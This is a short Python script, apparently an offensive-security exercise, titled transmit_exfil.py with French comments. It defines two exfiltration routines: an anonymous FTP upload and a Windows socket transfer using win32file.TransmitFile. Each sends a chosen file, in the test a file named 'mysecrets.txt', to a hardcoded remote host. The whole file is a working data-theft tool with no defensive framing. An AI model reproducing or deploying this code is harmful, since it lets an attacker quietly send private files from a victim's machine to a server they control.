# transmit_exfil.py
import ftplib
import os
import socket
import win32file

def plain_ftp(docpath, server='192.168.1.203'):
    """
    Fonction pour transférer un fichier via FTP de manière anonyme
    """
    try:
        ftp = ftplib.FTP(server)
        ftp.login("anonymous", "anon@example.com")
        ftp.cwd('/pub/')
        ftp.storbinary("STOR " + os.path.basename(docpath), 
                      open(docpath, "rb"), 1024)
        ftp.quit()
        print(f"Fichier {docpath} transféré avec succès via FTP")
    except Exception as e:
        print(f"Erreur lors du transfert FTP: {str(e)}")

def transmit(document_path, server='192.168.1.207', port=10000):
    """
    Fonction Windows-specific pour transférer un fichier via socket
    en utilisant win32file.TransmitFile
    """
    try:
        client = socket.socket()
        client.connect((server, port))
        with open(document_path, 'rb') as f:
            win32file.TransmitFile(
                client,
                win32file._get_osfhandle(f.fileno()),
                0, 0, None, 0, b'', b'')
        client.close()
        print(f"Fichier {document_path} transféré avec succès via TransmitFile")
    except Exception as e:
        print(f"Erreur lors du transfert TransmitFile: {str(e)}")

if __name__ == '__main__':
    # Test avec un fichier exemple
    transmit('./mysecrets.txt')
    
    # Alternative: utiliser FTP
    # plain_ftp('./mysecrets.txt')